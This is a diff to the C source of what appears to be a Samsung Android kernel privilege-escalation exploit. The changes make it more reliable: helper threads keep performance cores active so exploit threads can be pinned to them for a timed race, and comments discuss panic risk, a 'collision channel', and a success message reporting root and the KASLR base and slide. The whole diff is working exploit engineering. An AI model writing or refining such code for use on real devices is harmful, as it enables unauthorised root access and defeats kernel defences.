@@ -649,16 +649,18 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
 #if defined(RMG_PIN_TEST_PRIME)
-  /* Stability gate (2026-08-27): the whole attempt requires a legally
-   * pinnable perf-core pair (choreography core + consumer core). Samsung
-   * PM restricts perf cores for the shell domain in boot phases:
-   * observed OPEN for ~2 min after boot, then FULLY CLOSED for several
-   * minutes (the mid-boot window the pipeline lands in), settling into a
-   * light rotating restriction later. The wait polls while the device
-   * idles (no load, cooling) until a pair becomes legally pinnable —
-   * env-tunable so the budget can be tuned without a rebuild. Running
-   * without a pinned pair is the ~50% kernel-panic gamble we no longer
-   * take. */
+  /* Stability gate (2026-08-27, round 4): the attempt requires a legally
+   * pinnable perf-core pair (choreography core + consumer core). Root
+   * cause of the dynamic "no perf core usable" wall: WALT core_ctl HALTS
+   * idle perf cores and the kernel rejects pinning onto halted cores
+   * (EINVAL). The quiet-window wait above idles the device, which halts
+   * the cluster — so spawn the busy waker crew FIRST: its demand makes
+   * core_ctl resume the perf cores before the gate probe (verified on
+   * device). The gate wait remains as safety net for thermal/hyp pauses
+   * that load cannot override. Running without a pinned pair is the
+   * ~50% kernel-panic gamble we no longer take. */
+  rmg_waker_start(6);
+  usleep(500 * 1000); /* let core_ctl eval see the demand */
   {
     const char *gw = getenv("RMG_PIN_GATE_WAIT_SEC");
     int gate_wait_sec = 180;
@@ -678,6 +680,10 @@ int run_exploit(int argc, char **argv) {
              "cleanly\n", CORE);
     return 1;
   }
+  /* Pair is locked: move the crew off the choreography cores so it
+   * cannot disturb the calibrated collision channel. The pinned exploit
+   * threads keep the pair cores busy, and halt only takes idle cores. */
+  rmg_waker_relocate(rmg_pinned_core, rmg_consumer_core);
 #else
   pin_to_core(CORE);
 #endif
@@ -913,6 +919,13 @@ int run_exploit(int argc, char **argv) {
   run_main_route_threads();
 #endif
 
+#if defined(RMG_PIN_TEST_PRIME)
+  /* The timing-critical write stage is over: retire the waker crew so
+   * it stops burning cores (it self-terminates on parent death anyway,
+   * but on the success path the daemon keeps this process's children
+   * relevant until exit). */
+  rmg_waker_stop();
+#endif
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
              kaslr_done, kaslr_base, kaslr_slide);
